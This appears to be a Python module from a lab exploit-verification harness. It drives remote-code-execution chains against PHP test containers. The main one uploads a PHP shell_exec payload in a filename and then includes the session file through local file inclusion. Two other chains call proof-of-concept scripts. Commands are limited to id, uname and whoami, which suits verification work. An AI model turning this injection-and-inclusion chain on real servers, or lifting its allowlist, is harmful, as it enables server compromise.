"""Strategy executors.

- Chain A is implemented inline (upload-progress filename injection + LFI)
  with the benign allowlist, because the existing poc/verify_chain_a_lfi.py
  only proves a fixed marker and the driver needs `id` output.
- Chain C and rung-5b shell out to the already-verified POCs
  (poc/verify_rce_gadget.py, poc/verify_109619_rce.py) and parse their
  output, so the driver does not duplicate tested exploit logic.

Every executor emits the allowlisted command only (see guard.py).
"""

import os
import re
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

from . import probe
from .guard import check_cmd

REPO_ROOT = Path(__file__).resolve().parent.parent
POC_DIR = REPO_ROOT / "poc"

# expected output fragments for each allowlisted command (execution proof)
OUTPUT_MARKERS = {
    "id": b"uid=",
    "uname": b"Linux",
    "whoami": b"www-data",
}

# Chain C POC's --cmd choices are slightly richer than our allowlist
CHAIN_C_CMD_MAP = {"id": "id", "uname": "uname -a", "whoami": "whoami"}

SESSION_FILE_TPL = "/tmp/sessions/sess_{sid}"


@dataclass
class Result:
    strategy: str
    executed: bool
    output: str = ""
    detail: str = ""
    raw: str = ""
    findings: list = field(default_factory=list)

    def ok(self):
        return self.executed


def _run_subprocess(args, timeout=240):
    r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    return r.stdout, r.stderr, r.returncode


def _extract_line(blob, marker, encoding="latin-1"):
    if isinstance(blob, bytes):
        m = marker if isinstance(marker, bytes) else marker.encode(encoding)
        for line in blob.splitlines():
            if m in line:
                return line.decode(encoding, "replace").strip()
    else:
        m = marker.decode(encoding) if isinstance(marker, bytes) else marker
        for line in blob.splitlines():
            if m in line:
                return line.strip()
    return ""


def _clean_output(cmd, blob):
    """Extract just the command's output from a (possibly serialized/noisy)
    HTTP body. Returns a clean string or ''."""
    if isinstance(blob, str):
        blob = blob.encode("latin-1", "replace")
    if cmd == "id":
        m = re.search(rb"uid\s*=\s*\d+\([^)]*\).*?groups\s*=\s*[\d,\(\)a-zA-Z- ]+", blob)
        return m.group(0).decode("latin-1", "replace") if m else ""
    if cmd == "uname":
        return "Linux" if re.search(rb"\bLinux\b", blob) else ""
    if cmd == "whoami":
        return "www-data" if b"www-data" in blob else ""
    return ""


def run_chain_a(profile, cmd):
    cmd = check_cmd(cmd)
    a = profile.adapter
    sid = "abcdef0123456789abcdef0123456789"
    # Allowlisted command in single quotes (survives rfc1867 double-quoted
    # filename unescaping; barewords would be a PHP 8 Error).
    payload = f"<?php echo shell_exec('{cmd}');?>"
    body, boundary = probe.build_multipart(sid, "x", payload)

    res = Result(strategy="chain_a", executed=False)
    res.findings.append(f"injecting filename payload: {payload}")
    resp = probe.http_post(
        profile.host, profile.port, a.write_path, body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    res.findings.append(f"write {a.write_path}: {probe.status(resp)}")

    lfi_url = f"{a.lfi_path}?page={SESSION_FILE_TPL.format(sid=sid)}"
    resp = probe.http_get(profile.host, profile.port, lfi_url)
    b = probe.body(resp)
    res.findings.append(f"LFI {lfi_url}: {probe.status(resp)}")

    marker = OUTPUT_MARKERS[cmd]
    if marker in b and b"Fatal error" not in b and b"Uncaught Error" not in b:
        res.executed = True
        res.output = _clean_output(cmd, b)
        res.detail = f"{cmd} executed inside include(); output retrieved over HTTP"
    else:
        res.detail = "marker not found as executed output (LFI may be absent or misconfigured)"
    res.raw = b.decode("latin-1", "replace")
    return res


def run_chain_c(profile, cmd):
    cmd = check_cmd(cmd)
    a = profile.adapter
    poc = POC_DIR / "verify_rce_gadget.py"
    poc_cmd = CHAIN_C_CMD_MAP[cmd]
    res = Result(strategy="chain_c", executed=False)
    args = [
        sys.executable, str(poc),
        "--target", f"http://{profile.host}:{profile.port}",
        "--write-path", a.write_path,
        "--read-path", a.read_path,
        "--cmd", poc_cmd,
    ]
    out, err, rc = _run_subprocess(args)
    res.raw = out + err
    marker = OUTPUT_MARKERS[cmd]
    line = _extract_line(out, marker)
    if line:
        res.executed = True
        res.output = line
        res.detail = "__destruct gadget ran the allowlisted command; output returned over HTTP"
    else:
        res.detail = f"gadget did not return {cmd!r} output (exit {rc}); see raw"
    res.findings.append(f"poc={poc.name} rc={rc} cmd={poc_cmd}")
    return res


def run_rung5b(profile, cmd):
    cmd = check_cmd(cmd)
    poc = POC_DIR / "verify_109619_rce.py"
    res = Result(strategy="rung5b", executed=False)

    # Clear any stale proof file inside the target container so the verdict
    # cannot be satisfied by a prior run. (The POC clears only
    # repo/lab/webroot/p on the host, which is the wrong bind-mount for the
    # WordPress lab; clearing through the container works for every lab.)
    try:
        subprocess.run(
            ["docker", "exec", profile.container, "sh", "-c",
             "rm -rf /var/www/html/p"],
            check=False, capture_output=True, timeout=20,
        )
    except Exception:
        pass

    args = [
        sys.executable, str(poc),
        "--target", f"http://{profile.host}:{profile.port}",
        "--container", profile.container,
        "--cmd", cmd,
    ]
    out, err, rc = _run_subprocess(args, timeout=600)
    res.raw = out + err
    marker = OUTPUT_MARKERS[cmd]
    line = _extract_line(out, marker)
    evidence = "[EVIDENCE] RUNG 5b REPRODUCED" in out
    if evidence:
        res.executed = True
        res.output = _clean_output(cmd, out) or _extract_line(out, marker)
        res.detail = "terminal call fired; output retrieved over HTTP (fire-then-die)"
    else:
        res.detail = f"chain did not fire (exit {rc}); likely a stale worker — "
        res.detail += "recreate the lab (docker compose down && up) and rerun"
    res.findings.append(f"poc={poc.name} rc={rc} container={profile.container}")
    return res


EXECUTORS = {"chain_a": run_chain_a, "chain_c": run_chain_c, "rung5b": run_rung5b}